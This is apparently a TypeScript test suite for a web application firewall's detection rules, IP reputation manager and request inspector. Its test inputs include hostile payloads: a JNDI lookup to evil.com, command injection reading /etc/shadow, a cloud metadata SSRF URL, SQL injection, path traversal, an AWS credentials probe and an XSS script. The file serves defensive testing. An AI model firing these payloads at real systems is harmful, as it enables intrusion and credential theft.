import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { canonicalizeInput } from '../src/engine/canonicalizer.js';
import { computeRequestEntropy } from '../src/engine/entropy.js';
import { IpReputationManager } from '../src/quarantine/ip-reputation.js';
import { createDefaultRuleRegistry } from '../src/rules/default-rules.js';
import { WafInspector } from '../src/engine/inspector.js';
import { ScannerRule } from '../src/rules/scanner.rule.js';
import { ZeroDayRule } from '../src/rules/zeroday.rule.js';
import { RceRule } from '../src/rules/rce.rule.js';
import { SsrfRule } from '../src/rules/ssrf.rule.js';
import { SqliRule } from '../src/rules/sqli.rule.js';
import { TraversalRule } from '../src/rules/traversal.rule.js';
import { SensitiveProbeRule } from '../src/rules/sensitive-probe.rule.js';
import { CmsProbeRule } from '../src/rules/cms-probe.rule.js';
import { XssRule } from '../src/rules/xss.rule.js';

describe('Aegis Gate PEP — Canonicalizer Engine', () => {
  it('should recursively decode multi-encoded URLs', () => {
    const doubleEncoded = '%252e%252e%252fetc%252fpasswd';
    const canonical = canonicalizeInput(doubleEncoded);
    assert.strictEqual(canonical, '../etc/passwd');
  });

  it('should strip null bytes and SQL comments', () => {
    const raw = 'UN/* comment */ION \0 SELECT';
    const canonical = canonicalizeInput(raw);
    assert.strictEqual(canonical, 'UN ION SELECT');
  });
});

describe('Aegis Gate PEP — Shannon Entropy Calculation', () => {
  it('should compute low entropy for repetitive text', () => {
    const entropy = computeRequestEntropy('aaaaaa');
    assert.ok(entropy < 1.0, `Expected low entropy, got ${entropy}`);
  });

  it('should compute higher entropy for high-diversity random tokens', () => {
    const entropy = computeRequestEntropy('8f9a2b7c4d1e0f3a6b5c9d2e4f7a1b0c');
    assert.ok(entropy > 3.0, `Expected higher entropy, got ${entropy}`);
  });
});

describe('Aegis Gate PEP — IP Reputation Manager', () => {
  it('should manage banned IPs dynamically', () => {
    const ipMgr = new IpReputationManager();
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), false);

    ipMgr.ban('192.168.1.100');
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), true);
    assert.strictEqual(ipMgr.size(), 1);

    ipMgr.unban('192.168.1.100');
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), false);

    ipMgr.setAll(['10.0.0.1', '10.0.0.2']);
    assert.strictEqual(ipMgr.size(), 2);
    assert.strictEqual(ipMgr.isBanned('10.0.0.1'), true);
    assert.strictEqual(ipMgr.isBanned('10.0.0.2'), true);

    ipMgr.clear();
    assert.strictEqual(ipMgr.size(), 0);
  });
});

describe('Aegis Gate PEP — Individual WAF Rules', () => {
  const dummyCtx = (headers: Record<string, string> = {}) => ({
    url: '/test',
    method: 'GET',
    headers,
    rawBody: '',
    byteLength: 0,
    clientIp: '127.0.0.1'
  });

  it('ScannerRule should flag pentest tools User-Agents', () => {
    const rule = new ScannerRule();
    const matchNikto = rule.evaluate(dummyCtx({ 'user-agent': 'Nikto/2.1.6' }));
    assert.ok(matchNikto !== null);
    assert.strictEqual(matchNikto?.threatType, 'PENTEST_SCANNER_DETECTED');

    const matchClean = rule.evaluate(dummyCtx({ 'user-agent': 'Mozilla/5.0 (Windows NT 10.0)' }));
    assert.strictEqual(matchClean, null);
  });

  it('ZeroDayRule should flag PHP2Shell and JNDI lookups', () => {
    const rule = new ZeroDayRule();
    const matchJndi = rule.evaluate(dummyCtx(), '${jndi:ldap://evil.com/a}');
    assert.ok(matchJndi !== null);
    assert.strictEqual(matchJndi?.threatType, 'ZERO_DAY_VIRTUAL_PATCH');

    const matchPhp2Shell = rule.evaluate(dummyCtx(), 'cve-2026-109618 payload');
    assert.ok(matchPhp2Shell !== null);
  });

  it('RceRule should flag system command injections', () => {
    const rule = new RceRule();
    const match = rule.evaluate(dummyCtx(), '; cat /etc/shadow');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'COMMAND_INJECTION_RCE');
  });

  it('SsrfRule should flag cloud metadata IPs', () => {
    const rule = new SsrfRule();
    const match = rule.evaluate(dummyCtx(), 'http://169.254.169.254/latest/meta-data/');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SSRF_METADATA_PROBE');
  });

  it('SqliRule should flag UNION SELECT and comment attacks', () => {
    const rule = new SqliRule();
    const match = rule.evaluate(dummyCtx(), "' UNION SELECT 1,2,username,password FROM users--");
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SQL_INJECTION');

    // Vérifier l'absence de faux positifs sur les jetons OAuth contenant '--' (ex: session_state Keycloak)
    const oauthUrl = '/api/auth/callback?state=aa9789d9b417d8c6d41cf598c7efbb45&session_state=hPl3L99KOvbcIJ68HT8RJ--m&iss=https%3A%2F%2Fauth.aivo.fr%2Frealms%2Faegis&code=d644050e-e919-cfc5-79e8-16cbb45e8a46.hPl3L99KOvbcIJ68HT8RJ--m.ad55990a-e2bb-4d5d-96f6-4130145ecc82';
    const matchOauth = rule.evaluate(dummyCtx(), oauthUrl);
    assert.strictEqual(matchOauth, null, 'OAuth callback URL should NOT be flagged as SQL injection');
  });

  it('TraversalRule should flag /etc/passwd and directory traversal', () => {
    const rule = new TraversalRule();
    const match = rule.evaluate(dummyCtx(), '../../../../etc/passwd');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'PATH_TRAVERSAL_LFI');
  });

  it('SensitiveProbeRule should flag private keys and configs', () => {
    const rule = new SensitiveProbeRule();
    const match = rule.evaluate(dummyCtx(), '/.aws/credentials');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SENSITIVE_FILE_PROBE');
  });

  it('CmsProbeRule should flag admin scans', () => {
    const rule = new CmsProbeRule();
    const match = rule.evaluate(dummyCtx(), '/wp-login.php');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'CMS_PHP_BOT_PROBE');
  });

  it('XssRule should flag script injection and handlers', () => {
    const rule = new XssRule();
    const match = rule.evaluate(dummyCtx(), '<script>alert(1)</script>');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'XSS_ATTEMPT');
  });
});

describe('Aegis Gate PEP — Full WafInspector Pipeline', () => {
  const ruleRegistry = createDefaultRuleRegistry();
  const ipReputation = new IpReputationManager();
  let maxPayload = 32768;
  const inspector = new WafInspector(ruleRegistry, ipReputation, () => maxPayload);

  it('should block banned IP immediately', () => {
    ipReputation.ban('198.51.100.42');
    const verdict = inspector.inspect('/api/data', 'GET', {}, '', 0, '198.51.100.42');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.threat_type, 'BANNED_IP_BLACKLIST');
    assert.strictEqual(verdict.http_status, 403);
    ipReputation.unban('198.51.100.42');
  });

  it('should return 413 for payload exceeding limit', () => {
    maxPayload = 1000;
    const verdict = inspector.inspect('/api/upload', 'POST', { 'content-length': '2000' }, '', 2000, '127.0.0.1');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.http_status, 413);
    assert.ok(verdict.threat_type.includes('413'));
    maxPayload = 32768;
  });

  it('should allow clean legitimate traffic', () => {
    const verdict = inspector.inspect('/api/v1/metrics', 'GET', { 'user-agent': 'curl/7.88.1' }, '', 0, '127.0.0.1');
    assert.strictEqual(verdict.blocked, false);
    assert.strictEqual(verdict.decision, 'ALLOW');
    assert.strictEqual(verdict.http_status, 200);
    assert.strictEqual(verdict.threat_type, 'CLEAN_TRAFFIC');
  });
});
